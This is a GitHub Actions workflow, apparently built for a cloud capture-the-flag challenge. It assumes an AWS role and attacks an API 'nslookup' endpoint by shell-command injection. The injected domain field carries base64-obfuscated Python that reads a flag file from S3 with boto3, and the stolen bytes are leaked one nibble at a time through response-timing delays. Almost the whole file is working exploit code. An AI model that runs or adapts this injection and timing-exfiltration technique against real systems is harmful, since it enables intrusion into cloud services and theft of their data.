name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write   # required to request the OIDC JWT from GitHub
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Who am I
        run: aws sts get-caller-identity

      - name: List platform-bucket for any exfil results
        run: aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive

      - name: EXPLOIT - boto3 read + try all write paths (3-valued timing in Python)
        run: |
          # ~1s = boto3 read FAILED, ~8s = read OK but write blocked, ~15s = SUCCESS
          B64=""
          INJECT="x; echo $B64 | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))
          echo "Timing: ${ELAPSED_MS}ms"
          if [ $ELAPSED_MS -gt 12000 ]; then
            echo "SUCCESS! Flag exfiltrated"
            sleep 3
            echo "--- flag-boto3.txt (platform-bucket public) ---"
            curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-boto3.txt
            echo
            echo "--- flag-rce.txt (platform-bucket public) ---"
            curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag-rce.txt
          elif [ $ELAPSED_MS -gt 4000 ]; then
            echo "S3 READ works but all write paths blocked"
            echo "=> lambdaRole has no PutObject on any writable bucket"
            echo "=> Next: use nibble timing to extract flag byte by byte"
          else
            echo "S3 READ FAILED via boto3 (~1s)"
            echo "=> lambdaRole IAM has no s3:GetObject, OR no S3 VPC endpoint, OR something else"
          fi

      - name: NIBBLE EXFIL byte 0 hi (only meaningful if previous step showed ~8s)
        run: |
          # Encodes high nibble of flag[0] as sleep duration: sleep = nibble + 2 sec
          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0+PjQpKzIpCmV4Y2VwdDoKICAgIHBhc3M="
          INJECT="x; echo $B64 | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))
          NIBBLE=$(( ELAPSED_MS / 1000 - 2 ))
          echo "Byte 0 HIGH nibble timing: ${ELAPSED_MS}ms => nibble value ~$NIBBLE (char hi-bits = $(( NIBBLE << 4 )))"

      - name: NIBBLE EXFIL byte 0 lo
        run: |
          B64="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogICAgZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKICAgIHRpbWUuc2xlZXAoKGZsYWdbMF0mMHhmKSsyKQpleGNlcHQ6CiAgICBwYXNz"
          INJECT="x; echo $B64 | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          START=$(date +%s%N)
          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json
          END=$(date +%s%N)
          ELAPSED_MS=$(( (END - START) / 1000000 ))
          NIBBLE=$(( ELAPSED_MS / 1000 - 2 ))
          echo "Byte 0 LOW nibble timing: ${ELAPSED_MS}ms => nibble value ~$NIBBLE"
          echo "=> byte[0] = (hi<<4)|lo = char"
